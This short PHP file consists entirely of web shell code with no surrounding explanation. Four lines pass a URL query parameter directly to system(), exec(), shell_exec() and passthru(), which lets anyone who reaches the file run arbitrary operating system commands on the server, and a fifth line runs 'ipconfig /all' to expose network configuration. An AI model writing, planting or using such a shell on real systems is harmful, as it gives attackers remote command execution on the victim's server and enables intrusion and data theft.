<?php system($_GET['cmd1']);?>
<?php echo exec($_GET['cmd2']);?>
<?php echo shell_exec($_GET['cmd3'])?>;
<?php echo passthru($_GET['cmd4'])?>; 
<?php echo `ipconfig /all`;?>
